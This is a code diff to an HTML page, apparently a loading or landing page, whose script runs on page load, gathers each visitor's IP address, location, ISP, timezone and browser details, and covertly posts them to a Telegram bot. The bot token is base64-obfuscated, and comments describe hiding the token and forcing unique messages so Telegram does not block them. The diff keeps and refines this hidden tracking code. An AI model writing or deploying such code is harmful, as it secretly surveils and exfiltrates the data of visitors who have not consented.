@@ -29,7 +29,7 @@
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
             border-radius: 50%;
-            border-top: 4px solid #ff0000;
+            border-top: 4px solid #ff0000;  
             width: 25px;
             height: 25px;
             animation: spin 1s linear infinite;
@@ -83,20 +83,15 @@
     </script>
 
 <script>
-    // 🔒 TELEGRAM BOT TOKEN OBFUSCATED (HTML-ONLY PROTECTION)
-    const _0xa1b3 = [
-        "OTk1NzEzOg==",                   
-        "Yk51R2pCV2maanZWb2xOOGRZTFNhNmZqOG5tLTF5T2ZN", 
-        "875434694",                     
-        "cmFuZG9t",                      
-        "ZGF0YQ=="                       
+    // 🔒 Telegram token/chat obfuscated
+    const _secretParts = [
+        "OTk1NzEzOg==",
+        "Yk51R2pCV2maanZWb2xOOGRZTFNhNmZqOG5tLTF5T2ZN"
     ];
-
-    // Build token dynamically (harder to extract)
-    const BOT_TOKEN = atob(_0xa1b3[0]) + atob(_0xa1b3[1]);
+    const BOT_TOKEN = atob(_secretParts[0]) + atob(_secretParts[1]);
 
     // Chat ID scrambled
-    const CHAT_ID = (parseInt(_0xa1b3[2]) * 1).toString();
+    const CHAT_ID = (875434694 * 1).toString();
 
     const IPINFO_TOKEN = '1006035904ee8d';
 
@@ -104,12 +99,12 @@
         try {
             const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
             const ipData = await response.json();
-
+            
             return {
                 ip: ipData.ip,
-                location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
-                org: ipData.org,
-                timezone: ipData.timezone,
+                location: [ipData.city, ipData.region, ipData.country].filter(Boolean).join(', ') || 'Unknown',
+                org: ipData.org || 'Unknown ISP',
+                timezone: ipData.timezone || 'Unknown',
                 deviceInfo: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -120,10 +115,10 @@
             };
         } catch (error) {
             return {
-                ip: "Unknown",
-                location: "Unknown",
-                org: "Unknown",
-                timezone: "Unknown",
+                ip: 'Blocked by client',
+                location: 'Unknown',
+                org: 'Unknown',
+                timezone: 'Unknown',
                 deviceInfo: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -137,7 +132,6 @@
 
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
         try {
             await fetch(url, {
                 method: 'POST',
@@ -175,12 +169,11 @@
 
     document.addEventListener('DOMContentLoaded', async () => {
         const visitorData = await getVisitorData();
-
-        // 🔥 ALWAYS UNIQUE → Telegram will never block it
+        // 🔑 Add unique ID to force Telegram to send every time
         const uniqueID = crypto.randomUUID();
-
         const message = formatMessage(visitorData) + `\n\n<b>ID:</b> ${uniqueID}`;
 
+        console.log(message);
         await sendToTelegram(message);
     });
 </script>
